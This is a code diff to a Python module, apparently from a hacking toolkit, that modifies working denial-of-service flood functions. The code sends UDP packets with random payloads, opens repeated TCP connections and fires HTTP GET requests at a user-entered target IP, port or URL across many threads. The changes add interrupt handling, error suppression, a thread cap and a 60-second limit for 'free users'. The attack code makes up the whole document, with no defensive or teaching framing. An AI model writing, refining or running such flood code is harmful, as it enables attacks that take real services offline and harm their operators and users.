@@ -1,17 +1,28 @@
-# modules/ddos.py
-
 import os
 import sys
 import time
 import socket
 import threading
 import random
-import requests
-from core.utils import color, slowprint
-from core.error_fix import ensure_package
+import signal
 
-# Ensure dependencies
+# Ensure dependencies before import
+from core.error_fix import ensure_package
 ensure_package("requests")
+import requests
+
+from core.utils import color, slowprint
+
+stop_attack = False
+
+# ===== SIGNAL HANDLER ===== #
+def stop_handler(signum, frame):
+    global stop_attack
+    stop_attack = True
+    print(color("red", "\n[!] Attack interrupted by user! Exiting..."))
+    sys.exit(0)
+
+signal.signal(signal.SIGINT, stop_handler)
 
 # ===== BANNERS ===== #
 def show_banner(mode="user"):
@@ -42,14 +53,17 @@ def show_banner(mode="user"):
 def udp_flood(ip, port, duration):
     timeout = time.time() + duration
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    while time.time() < timeout:
+    while time.time() < timeout and not stop_attack:
         msg = os.urandom(random.randint(1024, 65500))
-        sock.sendto(msg, (ip, port))
-        print(color("magenta", f"[UDP] => {ip}:{port}"), end="\r")
+        try:
+            sock.sendto(msg, (ip, port))
+            print(color("magenta", f"[UDP] => {ip}:{port}"), end="\r")
+        except Exception as e:
+            continue
 
 def tcp_flood(ip, port, duration):
     timeout = time.time() + duration
-    while time.time() < timeout:
+    while time.time() < timeout and not stop_attack:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((ip, port))
@@ -61,12 +75,13 @@ def tcp_flood(ip, port, duration):
 
 def http_flood(target_url, duration):
     timeout = time.time() + duration
-    headers = {
-        "User-Agent": f"DDoS-Attacker/{random.randint(1000,9999)}"
-    }
-    while time.time() < timeout:
+    session = requests.Session()
+    while time.time() < timeout and not stop_attack:
+        headers = {
+            "User-Agent": f"DDoS-Agent/{random.randint(1000,9999)}"
+        }
         try:
-            requests.get(target_url, headers=headers)
+            session.get(target_url, headers=headers, timeout=2)
             print(color("yellow", f"[HTTP-GET] => {target_url}"), end="\r")
         except:
             continue
@@ -76,13 +91,16 @@ def user_udp(ip, port, duration):
     timeout = time.time() + duration
     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
     payload = b"#" * 1024
-    while time.time() < timeout:
-        sock.sendto(payload, (ip, port))
-        print(color("cyan", f"[USER_UDP] => {ip}:{port}"), end="\r")
+    while time.time() < timeout and not stop_attack:
+        try:
+            sock.sendto(payload, (ip, port))
+            print(color("cyan", f"[USER_UDP] => {ip}:{port}"), end="\r")
+        except:
+            continue
 
 def user_tcp(ip, port, duration):
     timeout = time.time() + duration
-    while time.time() < timeout:
+    while time.time() < timeout and not stop_attack:
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
             sock.connect((ip, port))
@@ -107,6 +125,10 @@ def start_ddos(mode="user"):
             duration = int(input(color("cyan", "Duration (seconds): ")))
             threads = int(input(color("cyan", "Thread count (e.g., 200): ")))
 
+            if threads > 500:
+                print(color("red", "[!] Too many threads! Max allowed is 500. Setting to 500."))
+                threads = 500
+
             print(color("green", "\n[✓] Launching Advanced Attack...\n"))
             time.sleep(1)
 
@@ -121,7 +143,12 @@ def start_ddos(mode="user"):
         else:
             ip = input(color("cyan", "Target IP: "))
             port = int(input(color("cyan", "Target Port: ")))
-            duration = int(input(color("cyan", "Duration (seconds): ")))
+            duration = int(input(color("cyan", "Duration (seconds, max 60): ")))
+
+            if duration > 60:
+                print(color("red", "[!] Free user limit: Max 60 seconds. Setting to 60."))
+                duration = 60
+
             print(color("green", "\n[✓] Launching Basic User Attack...\n"))
             for _ in range(30):
                 threading.Thread(target=user_udp, args=(ip, port, duration)).start()
